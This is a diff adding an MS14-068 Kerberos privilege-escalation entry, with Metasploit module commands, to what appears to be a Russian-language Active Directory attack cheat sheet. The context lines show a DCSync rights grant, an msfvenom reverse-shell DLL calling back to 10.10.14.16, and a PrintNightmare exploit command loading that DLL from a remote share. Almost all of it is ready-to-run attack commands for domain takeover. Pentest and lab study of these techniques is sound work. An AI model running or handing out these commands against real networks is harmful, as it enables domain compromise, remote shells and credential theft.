@@ -781,3 +781,13 @@ Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1337 -f dll -o /tmp/print.dll
       https://github.com/cube0x0/CVE-2021-1675 (Эксплойт)
     python3 ./CVE-2021-1675.py example.local/Alex:HappyHacking@192.168.0.134 '\\192.168.0.177\share\print.dll'
+
+
+#    Уязвимость MS14-068 (CVE-2014-6324)	(CVE-2014-6324 (MS14-068) — это критическая уязвимость в протоколе Kerberos в Microsoft Windows, которая позволяет повысить привилегии обычного пользователя домена до уровня доменного администратора. Уязвимость существует в реализации проверки подписи PAC (Privilege Attribute Certificate) в билетах Kerberos)
+
+    use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
+    set RHOST <DC_IP>
+    set USERNAME <user>
+    set PASSWORD <password>
+    set DOMAIN <domain.com>
+    run
